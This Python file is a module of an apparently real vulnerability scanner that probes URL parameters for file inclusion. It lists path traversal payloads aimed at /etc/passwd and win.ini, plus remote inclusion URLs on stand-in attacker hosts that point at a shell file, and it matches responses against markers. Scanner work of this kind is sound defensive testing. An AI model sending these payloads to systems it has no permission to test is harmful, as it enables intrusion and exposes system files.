"""Local/Remote File Inclusion scanner (path traversal)."""
from __future__ import annotations

import hashlib
from typing import Any, Dict, List

from bugwolf.scanners import Scanner
from bugwolf.scanners.live_finding import LiveFinding


SCHEMA = "bugwolf-scanner-v1"


LFI_PAYLOADS = (
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "local-stream-file-traversal-marker",
)

RFI_PAYLOADS = (
    "https://evil.example/shell.txt",
    "http://attacker.test/rfi/payload",
)


def _pid(payload: str) -> str:
    return "lfirfi-" + hashlib.sha256(payload.encode()).hexdigest()[:10]


class LFIRFIScanner(Scanner):
    name = "lfi_rfi"
    description = "Local and remote file inclusion via path traversal"
    bug_class = "lfi_rfi"
    default_severity = "critical"

    PAYLOADS = LFI_PAYLOADS + RFI_PAYLOADS

    def matches(self, target: Dict[str, Any]) -> bool:
        return "url" in target

    def scan(self, target: Dict[str, Any], transport) -> List[LiveFinding]:
        findings: List[LiveFinding] = []
        url = target.get("url", "")
        method = str(target.get("method", "GET")).upper()
        param = target.get("param", "file")
        for payload in self.PAYLOADS:
            sep = "&" if "?" in url else "?"
            target_url = f"{url}{sep}{param}={payload}"
            try:
                resp = transport(method, target_url, headers=None, body=None)
            except Exception:
                continue
            body = (resp.get("body") or "") if isinstance(resp, dict) else ""
            status = resp.get("status") if isinstance(resp, dict) else None
            indicators = ("root:x:0:0:", "[fonts]", "[extensions]", "evil.example/shell",
                          "attacker.test/rfi")
            if any(ind in body for ind in indicators) or (status == 200 and "etc/passwd" in payload and len(body) > 50):
                findings.append(LiveFinding(
                    scanner=self.name,
                    bug_class=self.bug_class,
                    severity=self.default_severity,
                    endpoint=url,
                    method=method,
                    evidence=f"file inclusion signal for {payload[:64]!r}",
                    reproducer=f"{method} {target_url}",
                    remediation="Resolve and validate file paths against an allow-list; never pass user input to the filesystem or to an HTTP fetch.",
                    payload_id=_pid(payload),
                    extra={"status": status, "snippet": body[:120]},
                ))
        return findings


__all__ = ["LFIRFIScanner", "LFI_PAYLOADS", "RFI_PAYLOADS"]
